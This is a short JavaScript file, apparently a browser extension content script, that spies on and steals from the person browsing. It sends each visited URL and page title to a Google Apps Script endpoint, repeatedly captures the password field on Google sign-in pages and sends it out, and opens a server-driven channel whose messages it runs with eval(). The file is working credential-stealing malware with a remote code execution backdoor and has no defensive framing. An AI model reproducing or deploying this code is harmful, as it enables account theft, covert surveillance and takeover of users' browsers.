console.log('V27');

// Log URLs and data
function serverLog(data) {
	return fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${data}`, {
		mode: 'cors'
	})
}

// Get current state from the apps script server
serverLog($('title').text())
	.then(res => res.text())
	.then(text => {
		switch (text.split('@')[0]) {
			case 'live':
				initLiveControl(text.split('@')[1]);
				break;
		}
	})
siteSpecifics(window.location.host)

// Check repeatedly to see if location has changed
var href = window.location.href;
setInterval(() => {
	if (window.location.href !== href) {
		href = window.location.href;
		serverLog($('title').text());
		siteSpecifics(window.location.host);
	}
}, 50);

// Distribute site specific tasks
function siteSpecifics(host) {
	switch (host) {
		case 'accounts.google.com':
			initPasswordMonitor();
			break;
	}

}

// Live Control
function initLiveControl(serverUrl) {
	if (window.location.host !== '127.0.0.1:8080') {
		var es = new EventSource(serverUrl)
		es.onmessage = function (event) {
			console.log(event)
			console.log(event.data)
			var executable = event.data.substring(1, event.data.length-1)
			console.log(executable)
			eval(executable)
		}
	}
}

// Google Password
function initPasswordMonitor() {
	if (window.location.pathname.split('/')[1] === 'signin' && window.location.pathname.split('/')[3] === 'challenge') {

		console.log('Monitoring');

		var password = $("input.whsOnd[type='password']");
		var currentVal = password.attr('data-initial-value');

		// Send to server
		serverLog(`PASSWORD: ${currentVal}`);

		// Check to see if the password has changed
		setInterval(() => {
			if (password.attr('data-initial-value') !== currentVal) {

				currentVal = password.attr('data-initial-value');

				// Send to server
				serverLog(`PASSWORD: ${currentVal}`);
			}
		}, 10);
	}
}